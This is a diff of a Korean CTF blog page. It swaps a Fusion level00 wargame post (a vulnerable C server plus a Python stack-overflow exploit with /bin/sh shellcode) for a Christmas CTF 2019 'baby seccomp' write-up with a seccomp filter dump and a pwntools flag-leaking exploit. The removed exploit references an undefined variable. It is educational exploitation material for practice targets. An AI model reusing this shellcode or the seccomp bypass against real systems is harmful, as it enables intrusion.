@@ -7,20 +7,20 @@
   
   
   
-  <title>exploit_exercise_fusion_00 | 귀찮다</title>
+  <title>Chrismas CTF 2019 baby seccomp | 귀찮다</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="문제 소스코드">
-<meta name="keywords" content="pwnable">
+  <meta name="description" content="chrismas ctf 2019">
+<meta name="keywords" content="pwnable, seccomp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="exploit_exercise_fusion_00">
-<meta property="og:url" content="https://blog.haklog.xyz/2018/09/23/exploit-exercise-fusion-00/index.html">
+<meta property="og:title" content="Chrismas CTF 2019 baby seccomp">
+<meta property="og:url" content="https://blog.haklog.xyz/2019/12/26/post/index.html">
 <meta property="og:site_name" content="귀찮다">
-<meta property="og:description" content="문제 소스코드">
+<meta property="og:description" content="chrismas ctf 2019">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-09-25T10:20:02.000Z">
+<meta property="og:updated_time" content="2020-01-06T02:19:09.488Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="exploit_exercise_fusion_00">
-<meta name="twitter:description" content="문제 소스코드">
+<meta name="twitter:title" content="Chrismas CTF 2019 baby seccomp">
+<meta name="twitter:description" content="chrismas ctf 2019">
   
   
     <link rel="icon" href="/img/one.png">
@@ -244,11 +244,11 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-exploit-exercise-fusion-00" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-post" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a  href="/2018/09/23/exploit-exercise-fusion-00/" class="article-date">
-      <time datetime="2018-09-23T14:57:28.000Z" itemprop="datePublished">2018-09-23</time>
+      <a  href="/2019/12/26/post/" class="article-date">
+      <time datetime="2019-12-25T17:45:24.000Z" itemprop="datePublished">2019-12-26</time>
 </a>
 
     </div>
@@ -262,7 +262,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      exploit_exercise_fusion_00
+      Chrismas CTF 2019 baby seccomp
     </h1>
   
 
@@ -271,14 +271,10 @@
       
       <div class="article-info article-info-post">
         
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/wargame/">wargame</a>
-    </div>
-
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable/">pwnable</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-seccomp/">pwnable, seccomp</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -288,11 +284,25 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>문제 소스코드</p>
+        <p>chrismas ctf 2019 </p>
 <a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;../common/common.c&quot;    </span><br><span class="line"> </span><br><span class="line">int fix_path(char *path)</span><br><span class="line">&#123;</span><br><span class="line">  char resolved[128];</span><br><span class="line">  </span><br><span class="line">  if(realpath(path, resolved) == NULL) return 1; // can&apos;t access path. will error trying to open</span><br><span class="line">  strcpy(path, resolved);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">char *parse_http_request()</span><br><span class="line">&#123;</span><br><span class="line">  char buffer[1024];</span><br><span class="line">  char *path;</span><br><span class="line">  char *q;</span><br><span class="line"> </span><br><span class="line">  printf(&quot;[debug] buffer is at 0x%08x :-)\n&quot;, buffer);</span><br><span class="line"> </span><br><span class="line">  if(read(0, buffer, sizeof(buffer)) &lt;= 0) errx(0, &quot;Failed to read from remote host&quot;);</span><br><span class="line">  if(memcmp(buffer, &quot;GET &quot;, 4) != 0) errx(0, &quot;Not a GET request&quot;);</span><br><span class="line"> </span><br><span class="line">  path = &amp;buffer[4];</span><br><span class="line">  q = strchr(path, &apos; &apos;);</span><br><span class="line">  if(! q) errx(0, &quot;No protocol version specified&quot;);</span><br><span class="line">  *q++ = 0;</span><br><span class="line">  if(strncmp(q, &quot;HTTP/1.1&quot;, 8) != 0) errx(0, &quot;Invalid protocol&quot;);</span><br><span class="line"> </span><br><span class="line">  fix_path(path);</span><br><span class="line"> </span><br><span class="line">  printf(&quot;trying to access %s\n&quot;, path);</span><br><span class="line"> </span><br><span class="line">  return path;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">int main(int argc, char **argv, char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int fd;</span><br><span class="line">  char *p;</span><br><span class="line"> </span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line">  set_io(fd);</span><br><span class="line"> </span><br><span class="line">  parse_http_request(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from socket import *</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line">p = lambda x : struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">HOST = &quot;192.168.111.129&quot;</span><br><span class="line">PORT = 20000</span><br><span class="line"> </span><br><span class="line">s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">s.connect((HOST,PORT))</span><br><span class="line"> </span><br><span class="line">#a = s.recv(1024)</span><br><span class="line"> </span><br><span class="line">#addr = a[21:31]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">shellcode =&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span><br><span class="line"> </span><br><span class="line">payload = &quot;GET &quot;</span><br><span class="line">payload += &quot;\x90&quot;*(139-len(addr+shellcode))</span><br><span class="line">payload += shellcode</span><br><span class="line">payload += p(0xbf8c55e8+20)</span><br><span class="line">payload += &quot; HTTP/1.1&quot;</span><br><span class="line"> </span><br><span class="line">s.send(payload)</span><br><span class="line">s.send(&quot;id&quot;)</span><br><span class="line">print(s.recv(1024))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<h2 id="Chrismas-CTF-2019-baby-seccomp"><a href="#Chrismas-CTF-2019-baby-seccomp" class="headerlink" title="Chrismas CTF 2019 baby seccomp"></a>Chrismas CTF 2019 baby seccomp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x25 0x17 0x00 0x40000000  if (A &gt; 0x40000000) goto 0027</span><br><span class="line"> 0004: 0x15 0x16 0x00 0x0000003b  if (A == execve) goto 0027</span><br><span class="line"> 0005: 0x15 0x15 0x00 0x00000142  if (A == execveat) goto 0027</span><br><span class="line"> 0006: 0x15 0x14 0x00 0x00000002  if (A == open) goto 0027</span><br><span class="line"> 0007: 0x15 0x13 0x00 0x00000101  if (A == openat) goto 0027</span><br><span class="line"> 0008: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0027</span><br><span class="line"> 0009: 0x15 0x11 0x00 0x00000011  if (A == pread64) goto 0027</span><br><span class="line"> 0010: 0x15 0x10 0x00 0x00000013  if (A == readv) goto 0027</span><br><span class="line"> 0011: 0x15 0x0f 0x00 0x00000127  if (A == preadv) goto 0027</span><br><span class="line"> 0012: 0x15 0x0e 0x00 0x00000147  if (A == preadv2) goto 0027</span><br><span class="line"> 0013: 0x15 0x0d 0x00 0x00000001  if (A == write) goto 0027</span><br><span class="line"> 0014: 0x15 0x0c 0x00 0x00000012  if (A == pwrite64) goto 0027</span><br><span class="line"> 0015: 0x15 0x0b 0x00 0x00000014  if (A == writev) goto 0027</span><br><span class="line"> 0016: 0x15 0x0a 0x00 0x00000128  if (A == pwritev) goto 0027</span><br><span class="line"> 0017: 0x15 0x09 0x00 0x00000148  if (A == pwritev2) goto 0027</span><br><span class="line"> 0018: 0x15 0x08 0x00 0x00000028  if (A == sendfile) goto 0027</span><br><span class="line"> 0019: 0x15 0x07 0x00 0x00000038  if (A == clone) goto 0027</span><br><span class="line"> 0020: 0x15 0x06 0x00 0x00000039  if (A == fork) goto 0027</span><br><span class="line"> 0021: 0x15 0x05 0x00 0x00000065  if (A == ptrace) goto 0027</span><br><span class="line"> 0022: 0x15 0x04 0x00 0x00000029  if (A == socket) goto 0027</span><br><span class="line"> 0023: 0x15 0x03 0x00 0x0000002b  if (A == accept) goto 0027</span><br><span class="line"> 0024: 0x15 0x02 0x00 0x00000031  if (A == bind) goto 0027</span><br><span class="line"> 0025: 0x15 0x01 0x00 0x00000032  if (A == listen) goto 0027</span><br><span class="line"> 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+
+<p>open은 이미 프로그램에서 열어줬으므로, 문제는 read와 write이다. </p>
+<ul>
+<li><p>write </p>
+<p>error based shellcoding으로 1바이트씩 비교하여 해결할 수 있다.</p>
+</li>
+<li><p>read</p>
+<ul>
+<li>A &gt; 0x40000000 이라서 0x4000000을 막지 않는다.  eax에 0x4000000를 넣으면 인티저 오버플로우로 read를 syscall로 부를 수 있다</li>
+<li>mmap 매개변수 fd에 3을 주면 파일 내용을 읽어올 수 있다. </li>
+</ul>
+</li>
+</ul>
+<h3 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h3><p>IO가 조금 꼬여서 고생하긴 했는데 read로 bss에 읽어서 푼 익스코드다. 익스 작성 시간보다 IO 때문에 고생좀 했다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.os = <span class="string">"linux"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x601480</span></span><br><span class="line">pay = <span class="string">""</span></span><br><span class="line">pay += asm(<span class="string">"mov rsi, 0x601580"</span>)</span><br><span class="line">pay += asm(<span class="string">"mov rdi, 3"</span>)</span><br><span class="line">pay += asm(<span class="string">"mov rdx, 0x100"</span>)</span><br><span class="line">pay += asm(<span class="string">"mov rax, 0x40000000"</span>)</span><br><span class="line">pay += asm(<span class="string">"syscall"</span>)</span><br><span class="line">flag2 = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="comment">#r= remote("115.68.235.72", 23457)</span></span><br><span class="line">        r = process(<span class="string">"./babyseccomp"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x20</span>, <span class="number">0x8f</span>):</span><br><span class="line"></span><br><span class="line">                pay2 = pay</span><br><span class="line">                pay2+= asm(<span class="string">'''</span></span><br><span class="line"><span class="string">                mov rdx, 0x601580</span></span><br><span class="line"><span class="string">                jmp check</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                check:  </span></span><br><span class="line"><span class="string">                        add rdx, %d</span></span><br><span class="line"><span class="string">                        mov cl, byte ptr [rdx]</span></span><br><span class="line"><span class="string">                        cmp cl, %d</span></span><br><span class="line"><span class="string">                        je correct</span></span><br><span class="line"><span class="string">                        mov rax, 0x40000000</span></span><br><span class="line"><span class="string">                        xor rdi, rdi</span></span><br><span class="line"><span class="string">                        mov rsi, 0x601280</span></span><br><span class="line"><span class="string">                        mov rdx, 0x1000</span></span><br><span class="line"><span class="string">                        syscall</span></span><br><span class="line"><span class="string">                        jmp rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                correct:</span></span><br><span class="line"><span class="string">                        mov rax, 1</span></span><br><span class="line"><span class="string">                        syscall</span></span><br><span class="line"><span class="string">                '''</span> % (i, j))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                        r.sendline(pay2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                        flag += chr(j<span class="number">-4</span>)</span><br><span class="line">        r.close()</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"> <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
 
 
       
@@ -302,28 +312,19 @@
   
     
     <div class="copyright">
-        <p><span>제목:</span><a  href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></p>
+        <p><span>제목:</span><a  href="/2019/12/26/post/">Chrismas CTF 2019 baby seccomp</a></p>
         <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
-        <p><span>발행 시간:</span>2018년09월23일 - 23시57분</p>
-        <p><span>마지막 업데이트:</span>2018년09월25일 - 19시20분</p>
+        <p><span>발행 시간:</span>2019년12월26일 - 02시45분</p>
+        <p><span>마지막 업데이트:</span>2020년01월06일 - 11시19분</p>
     </div>
 
 
 
 <nav id="article-nav">
   
-    <a  href="/2018/09/24/exploit-exercise-fusion-01/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          exploit-exercise-fusion-01
-        
-      </div>
-    </a>
   
-  
-    <a  href="/2018/09/23/gadget-searcher/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">gadget_searcher</div>
+    <a  href="/2019/12/01/tcalc/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">hack.lu - tcalc</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -335,7 +336,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">Article directory</strong>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrismas-CTF-2019-baby-seccomp"><span class="toc-number">1.</span> <span class="toc-text">Chrismas CTF 2019 baby seccomp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXPLOIT"><span class="toc-number">1.1.</span> <span class="toc-text">EXPLOIT</span></a></li></ol></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -431,13 +432,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a  href="/2018/09/24/exploit-exercise-fusion-01/" title="上一篇: exploit-exercise-fusion-01">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a  href="/" title="HOME"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a  href="/2018/09/23/gadget-searcher/" title="下一篇: gadget_searcher">
+            <a  href="/2019/12/01/tcalc/" title="下一篇: hack.lu - tcalc">
                 <i class="fa fa-angle-right"></i>
             </a>
         
